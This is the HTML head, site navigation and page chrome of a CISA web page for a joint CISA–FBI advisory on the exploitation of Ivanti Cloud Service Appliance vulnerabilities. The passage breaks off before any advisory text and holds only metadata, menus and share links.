

<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#" class="no-js">
  <head>
    <meta charset="utf-8" />
<meta name="description" content="The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory in" />
<link rel="canonical" href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" />
<meta property="og:site_name" content="Cybersecurity and Infrastructure Security Agency CISA" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" />
<meta property="og:title" content="Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications | CISA" />
<meta property="og:description" content="The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory in response to exploitation in September 2024 of vulnerabilities in Ivanti Cloud Service Appliances (CSA)." />
<meta name="Generator" content="Drupal 10 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="/profiles/cisad8_gov/themes/custom/gesso/favicon.png" type="image/png" />

    <title>Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications | CISA</title>
    <link rel="stylesheet" media="all" href="/core/modules/system/css/components/align.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/fieldgroup.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/container-inline.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/clearfix.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/details.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/hidden.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/item-list.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/js.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/nowrap.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/position-container.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/reset-appearance.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/resize.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-counter.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-counters.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-general-info.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/system/css/components/tablesort.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/misc/components/progress.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/misc/components/ajax-progress.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/core/modules/views/css/views.module.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/tablesaw-base.css?sqk2jp" />
<link rel="stylesheet" media="screen" href="/modules/contrib/responsive_tables_filter/css/tablesaw-responsive.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/tables.columntoggle.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/responsive_tables_filter/css/customizations.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/profiles/cisad8_gov/modules/custom/toolbar_tasks/css/toolbar.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/extlink/css/extlink.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/ckeditor_accordion/css/accordion.frontend.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/better_social_sharing_buttons/css/better_social_sharing_buttons.css?sqk2jp" />
<link rel="stylesheet" media="all" href="/modules/contrib/paragraphs/css/paragraphs.unpublished.css?sqk2jp" />
<link rel="stylesheet" media="all" href="//fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&amp;family=Public+Sans:wght@400;500;600;700&amp;display=swap" />
<link rel="stylesheet" media="all" href="/profiles/cisad8_gov/themes/custom/gesso/dist/css/styles.css?sqk2jp" />

    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","pathPrefix":"","currentPath":"node\/22868","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"gtm":{"tagId":null,"settings":{"data_layer":"dataLayer","include_classes":false,"allowlist_classes":"","blocklist_classes":"","include_environment":false,"environment_id":"","environment_token":""},"tagIds":["GTM-53QLXSL9"]},"gtag":{"tagId":"","consentMode":false,"otherIds":[],"events":[],"additionalConfigInfo":[]},"ajaxPageState":{"libraries":"eJxdj2GSgzAIhS8UzZEyJMGYFYMTiNbbb7rW7rR_3vAx8B54VMXqhEMGcjJDzSU531S5iBU9qbMJC8asXB2EwDVmLvZdjVPloliiwYf26cXG2jag8YUmMSdCp5Bs6vLNI_zA47O5mtTkiGKnTHjXidgD3aQIgtVsUCFV2Ga5U_87Yytb85RlxmgqytY_yvszwxOK6979c3sRHMPFRk5RXK3v9kaZyUPtG7L0yItMkwlj4t29boYCdGoOYokhDm8cQixmz3iI_dNx5dgIfwHU1ZG_","theme":"guswds","theme_token":null},"ajaxTrustedUrl":[],"data":{"extlink":{"extTarget":false,"extTargetAppendNewWindowLabel":"(opens in a new window)","extTargetNoOverride":false,"extNofollow":false,"extTitleNoOverride":false,"extNoreferrer":false,"extFollowNoOverride":false,"extClass":"ext","extLabel":"(link is external)","extImgClass":false,"extSubdomains":true,"extExclude":"(.\\.gov$)|(.\\.mil$)|(.\\.mil\/)|(.\\.gov\/)","extInclude":"","extCssExclude":".c-menu--social,.c-menu--footer,.c-social-links,.c-text-cta--button,.usa-footer__contact-info","extCssInclude":"","extCssExplicit":"","extAlert":true,"extAlertText":"You are now leaving an official website of the United State Government (USG), the Department of Homeland Security (DHS) and the Cybersecurity and Infrastructure Security Agency (CISA). Links to non-USG, non-DHS and non-CISA sites are provided for the visitor\u0027s convenience and do not represent an endorsement by USG, DHS or CISA of any commercial or private issues, products or services. Note that the privacy policy of the linked site may differ from that of USG, DHS and CISA.","extHideIcons":false,"mailtoClass":"mailto","telClass":"","mailtoLabel":"(link sends email)","telLabel":"(link is a phone number)","extUseFontAwesome":false,"extIconPlacement":"append","extPreventOrphan":false,"extFaLinkClasses":"fa fa-external-link","extFaMailtoClasses":"fa fa-envelope-o","extAdditionalLinkClasses":"","extAdditionalMailtoClasses":"","extAdditionalTelClasses":"","extFaTelClasses":"fa fa-phone","whitelistedDomains":[],"extExcludeNoreferrer":""}},"ckeditorAccordion":{"accordionStyle":{"collapseAll":1,"keepRowsOpen":0,"animateAccordionOpenAndClose":1,"openTabsWithHash":1}},"user":{"uid":0,"permissionsHash":"0f75d40308887aebba0d5b0d2671305b73c9431902f86e672380a6dc6ab97d07"}}</script>
<script src="/core/misc/drupalSettingsLoader.js?v=10.3.10"></script>
<script src="/modules/contrib/google_tag/js/gtm.js?sqk2jp"></script>
<script src="/modules/contrib/google_tag/js/gtag.js?sqk2jp"></script>

  </head>
  <body  class="path-node not-front node-page node-page--node-type-advisory" id="top">
    
<div  class="c-skiplinks">
  <a href="#main" class="c-skiplinks__link u-visually-hidden u-focusable">Skip to main content</a>
</div>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-53QLXSL9"
                  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
    

<div  class="l-site-container">
    
      
<section  class="usa-banner" aria-label="Official government website">
  <div class="usa-accordion">  <header class="usa-banner__header">
    <div class="usa-banner__inner">
      <div class="grid-col-auto">
        <img class="usa-banner__header-flag" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png" alt="U.S. flag" />
      </div>
      <div class="grid-col-fill tablet:grid-col-auto">
        <p class="usa-banner__header-text">An official website of the United States government</p>
              <p class="usa-banner__header-action" aria-hidden="true">Here’s how you know</p></div>
        <button class="usa-accordion__button usa-banner__button" aria-expanded="false" aria-controls="gov-banner">
          <span class="usa-banner__button-text">Here’s how you know</span>
        </button>
          </div>
  </header>
      <div class="usa-banner__content usa-accordion__content" id="gov-banner">
      <div class="grid-row grid-gap-lg">
                  <div class="usa-banner__guidance tablet:grid-col-6">
            <img class="usa-banner__icon usa-media-block__img" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg" alt="Dot gov">
            <div class="usa-media-block__body">
              <p>
                <strong>Official websites use .gov</strong>
                <br> A <strong>.gov</strong> website belongs to an official government organization in the United States.
              </p>
            </div>
          </div>
                  <div class="usa-banner__guidance tablet:grid-col-6">
            <img class="usa-banner__icon usa-media-block__img" src="/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg" alt="HTTPS">
            <div class="usa-media-block__body">
              <p>
                <strong>Secure .gov websites use HTTPS</strong>
                <br> A <strong>lock</strong> (<span class="icon-lock"><svg xmlns="http://www.w3.org/2000/svg" width="52" height="64" viewBox="0 0 52 64" class="usa-banner__lock-image" role="img" aria-labelledby="banner-lock-title banner-lock-description"><title id="banner-lock-title">Lock</title><desc id="banner-lock-description">A locked padlock</desc><path fill="#000000" fill-rule="evenodd" d="M26 0c10.493 0 19 8.507 19 19v9h3a4 4 0 0 1 4 4v28a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V32a4 4 0 0 1 4-4h3v-9C7 8.507 15.507 0 26 0zm0 8c-5.979 0-10.843 4.77-10.996 10.712L15 19v9h22v-9c0-6.075-4.925-11-11-11z"/></svg></span>) or <strong>https://</strong> means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.
              </p>
            </div>
          </div>
              </div>
    </div>
  </div>
  </section>
  



  <div  class="c-block c-global-header-btns c-global-btns">

      <div  class="l-constrain l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-globalbuttons" class="c-block c-block--provider-block-content c-block--id-block-content83069f9f-34fc-4d54-86ec-936a204f8088">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><a class="c-button c-button--basic c-button--blue" href="/resources-tools/resources/free-cybersecurity-services-and-tools" title="Free Cyber Services">Free Cyber Services</a><a class="c-button c-button--basic c-button--green60" href="/securebydesign">Secure by design </a><a class="c-button c-button--basic c-button--teal" href="/node/18883">Secure Our World</a><a class="c-button c-button--campaign" href="/node/8056">Shields Up</a><a class="c-button c-button--report" href="/report">Report A Cyber Issue</a></p></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
  
  


<div class="usa-overlay"></div>
<header  class="usa-header usa-header--extended" role="banner">
        
<div  class="usa-navbar">
  <div class="l-constrain">
    <div class="usa-navbar__row">
                                    



  <div  class="c-block c-site-header">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-cisaheaderblock" class="c-block c-block--provider-block-content c-block--id-block-contentbc4e6844-86b4-4e20-b163-a73bda3d1d76">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><a href="/"><img src = "/sites/default/files/images/SVG/header_logo_tagline_update.svg" alt="Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience"/><img class="print-only" src = "/sites/default/files/images/SVG/header_logo_tagline_update.png" alt="Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience"/></a></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>

        



  <div  class="c-block c-site-header-mobile">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-cisaheaderblockmobile" class="c-block c-block--provider-block-content c-block--id-block-content283396c9-cd36-4ce3-b1e2-9b5576ab4f50">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><a href="/"><img src = "/sites/default/files/images/SVG/mobile_logo_wordmark.svg" alt="CISA Logo"/></a></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
            <div class="usa-navbar__search">
        <div class="usa-navbar__search-header">
          <p>Search</p>
        </div>
        
<div  class="usa-search">
  <script async src=https://cse.google.com/cse.js?cx=ffc4c79e29d5b3a8c></script>
  <div class="gcse-searchbox-only" data-resultsurl="/search">&nbsp;</div>
</div>
      </div>
      <button class="mobile-menu-button usa-menu-btn">Menu</button>
    </div>
  </div>
</div>
    



  <div  class="c-block c-tagline-mobile">

      <div  class="l-constrain">
  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-guswds-mobiletaglinecontainer" class="c-block c-block--provider-block-content c-block--id-block-contentc8d12e9d-7e48-4708-90c1-563609c4b566">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><center><img src = "/sites/default/files/images/SVG/header_tagline_mobile_update.svg" alt = "America's Cyber Defense Agency" /></center></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
      </div>
  
  </div>
    

<nav  class="usa-nav" role="navigation" aria-label="Primary navigation">
  <div class="usa-nav__inner l-constrain">
    <div class="usa-nav__row">
      <button class="usa-nav__close">Close</button>
      
<div  class="usa-search">
  <script async src=https://cse.google.com/cse.js?cx=ffc4c79e29d5b3a8c></script>
  <div class="gcse-searchbox-only" data-resultsurl="/search">&nbsp;</div>
</div>
                
  
          <ul class="usa-nav__primary usa-accordion">
    
    
              <li class="usa-nav__primary-item topics">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-1">
          <span>Topics</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-1" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/topics">Topics</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/cybersecurity-best-practices">
          <span>Cybersecurity Best Practices</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/cyber-threats-and-advisories">
          <span>Cyber Threats and Advisories</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/critical-infrastructure-security-and-resilience">
          <span>Critical Infrastructure Security and Resilience</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/election-security">
          <span>Election Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/emergency-communications">
          <span>Emergency Communications</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/industrial-control-systems">
          <span>Industrial Control Systems</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/information-communications-technology-supply-chain-security">
          <span>Information and Communications Technology Supply Chain Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/partnerships-and-collaboration">
          <span>Partnerships and Collaboration</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/physical-security">
          <span>Physical Security</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/topics/risk-management">
          <span>Risk Management</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          

<div  class="c-menu-feature-links">
      <div class="c-menu-feature-links__title">
      <a href="/audiences">        How can we help?
      </a>    </div>
        <div class="c-menu-feature-links__content"><a href="/topics/government">Government</a><a href="/topics/educational-institutions">Educational Institutions</a><a href="/topics/industry">Industry</a><a href="/topics/state-local-tribal-and-territorial">State, Local, Tribal, and Territorial</a><a href="/topics/individuals-and-families">Individuals and Families</a><a href="/topics/small-and-medium-businesses">Small and Medium Businesses</a><a href="/audiences/find-help-locally">Find Help Locally</a><a href="/audiences/faith-based-community">Faith-Based Community</a><a href="/audiences/executives">Executives</a><a href="/audiences/high-risk-communities">High-Risk Communities</a></div>
  </div>

              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item spotlight">
      
      
                      <a href="/spotlight" class="usa-nav__link" >
          <span>Spotlight</span>
        </a>
              
              </li>
          
              <li class="usa-nav__primary-item resources--tools">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-3">
          <span>Resources &amp; Tools</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-3" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/resources-tools">Resources &amp; Tools</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/all-resources-tools">
          <span>All Resources &amp; Tools</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/services">
          <span>Services</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/programs">
          <span>Programs</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/resources">
          <span>Resources</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/training">
          <span>Training</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/resources-tools/groups">
          <span>Groups</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item news--events">
      
              <button class="usa-accordion__button usa-nav__link usa-current" aria-expanded="false" aria-controls="basic-mega-nav-section-4">
          <span>News &amp; Events</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-4" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/news-events">News &amp; Events</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/news">
          <span>News</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/events">
          <span>Events</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/cybersecurity-advisories">
          <span>Cybersecurity Alerts &amp; Advisories</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/directives">
          <span>Directives</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/request-speaker">
          <span>Request a CISA Speaker</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/news-events/congressional-testimony">
          <span>Congressional Testimony</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-conferences">
          <span>CISA Conferences</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-live">
          <span>CISA Live!</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item careers">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-5">
          <span>Careers</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-5" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/careers">Careers</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/benefits-perks">
          <span>Benefits &amp; Perks</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/hirevue-applicant-reasonable-accommodations-process">
          <span>HireVue Applicant Reasonable Accommodations Process</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/general-recruitment-and-hiring-faqs">
          <span>Hiring</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/resume-application-tips">
          <span>Resume &amp; Application Tips</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/students-recent-graduates-employment-opportunities">
          <span>Students &amp; Recent Graduates</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/veteran-and-military-spouse-employment-opportunities">
          <span>Veteran and Military Spouses</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/careers/work-cisa">
          <span>Work @ CISA</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
              <li class="usa-nav__primary-item about">
      
              <button class="usa-accordion__button usa-nav__link " aria-expanded="false" aria-controls="basic-mega-nav-section-6">
          <span>About</span>
        </button>
      
                
  
          <div id="basic-mega-nav-section-6" class="usa-nav__submenu usa-megamenu" hidden="">

              <div class="usa-megamenu__parent-link">
          <a href="/about">About</a>
        </div>
              <div class="usa-megamenu__menu-items">
    
    
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/divisions-offices">
          <span>Divisions &amp; Offices</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/regions">
          <span>Regions</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/leadership">
          <span>Leadership</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/doing-business-cisa">
          <span>Doing Business with CISA</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/site-links">
          <span>Site Links</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/reporting-employee-and-contractor-misconduct">
          <span>Reporting Employee and Contractor Misconduct</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-github">
          <span>CISA GitHub</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/cisa-central">
          <span>CISA Central</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/2024YIR">
          <span>2024 Year In Review</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/contact-us">
          <span>Contact Us </span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/eeo">
          <span>Equal Employment Opportunity</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/about/contact-us/subscribe-updates-cisa">
          <span>Subscribe</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/rap">
          <span>Reasonable Accommodations &amp; Accessibility</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/sep">
          <span>Special Emphasis Programs</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/no-fear-act">
          <span>No FEAR Act Notice &amp; Reports</span>
        </a>
                  </div>
              
              </div>
          
              <div class="usa-col">

              
      
                        <div class="usa-nav__submenu-item">
                <a href="/eeo-policies">
          <span>Policies &amp; Plans</span>
        </a>
                  </div>
              
              </div>
          
            </div>
                          
              </div>
    
  
      
              </li>
          
    
      </ul>
    
  


            



  <div  class="c-block c-global-menu-btns c-global-btns">

  
  
    

      <div  class="c-block__content">
  
      





  <div  id="block-globalbuttons" class="c-block c-block--provider-block-content c-block--id-block-content83069f9f-34fc-4d54-86ec-936a204f8088">

  
  
    

      <div  class="c-block__content">
  
      




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p><a class="c-button c-button--basic c-button--blue" href="/resources-tools/resources/free-cybersecurity-services-and-tools" title="Free Cyber Services">Free Cyber Services</a><a class="c-button c-button--basic c-button--green60" href="/securebydesign">Secure by design </a><a class="c-button c-button--basic c-button--teal" href="/node/18883">Secure Our World</a><a class="c-button c-button--campaign" href="/node/8056">Shields Up</a><a class="c-button c-button--report" href="/report">Report A Cyber Issue</a></p></div></div>

  
      </div>
  
  
  </div>

  
      </div>
  
  
  </div>
    </div>
  </div>
</nav>
    </header>


  
  
  
<div  class="l-breadcrumb">
  <div class="l-constrain">
    <div class="l-breadcrumb__row">
      







  
  
    

  
              


<nav  aria-labelledby="breadcrumb-label" class="c-breadcrumb" role="navigation">
  <div class="l-constrain">
    <div
       id="breadcrumb-label" class="c-breadcrumb__title  u-visually-hidden">Breadcrumb</div>
    <ol class="c-breadcrumb__list">
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/">Home</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events">News & Events</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events/cybersecurity-advisories">Cybersecurity Advisories</a>
                  </li>
              <li class="c-breadcrumb__item">
                      <a class="c-breadcrumb__link" href="/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94">Cybersecurity Advisory</a>
                  </li>
          </ol>
  </div>
</nav>

  
  
  
  






  <div  id="block-bettersocialsharingbuttons" class="c-block c-block--social-share c-block--provider-better-social-sharing-buttons c-block--id-social-sharing-buttons-block">

  
  
    

      <div  class="c-block__content">
  
      <div class="c-block__row">
      <span>Share:</span>
      

<div style="display: none"><link rel="preload" href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg" as="image" type="image/svg+xml" crossorigin="anonymous" /></div>

<div class="social-sharing-buttons">
                <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a&amp;title=Threat%20Actors%20Chained%20Vulnerabilities%20in%20Ivanti%20Cloud%20Service%20Applications" target="_blank" title="Share to Facebook" aria-label="Share to Facebook" class="social-sharing-buttons__button share-facebook" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#facebook" />
            </svg>
        </a>
    
                <a href="https://twitter.com/intent/tweet?text=Threat%20Actors%20Chained%20Vulnerabilities%20in%20Ivanti%20Cloud%20Service%20Applications+https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" target="_blank" title="Share to X" aria-label="Share to X" class="social-sharing-buttons__button share-x" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#x" />
            </svg>
        </a>
    
        
        
        
                <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" target="_blank" title="Share to Linkedin" aria-label="Share to Linkedin" class="social-sharing-buttons__button share-linkedin" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#linkedin" />
            </svg>
        </a>
    
        
        
        
        
                <a href="mailto:?subject=Threat%20Actors%20Chained%20Vulnerabilities%20in%20Ivanti%20Cloud%20Service%20Applications&amp;body=https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" title="Share to Email" aria-label="Share to Email" class="social-sharing-buttons__button share-email" target="_blank" rel="noopener">
            <svg width="18px" height="18px" style="border-radius:3px;">
                <use href="/modules/contrib/better_social_sharing_buttons/assets/dist/sprites/social-icons--no-color.svg#email" />
            </svg>
        </a>
    
        
    </div>

    </div>
  
      </div>
  
  
  </div>

    </div>
  </div>
</div>

  
  

  <main id="main" class="c-main" role="main" tabindex="-1">
        
      
    


<div  class="l-content">
          







  
  
    

  
            






<div  class="is-promoted l-full">
    <div class="l-full__header">
        
<div  class="c-page-title">
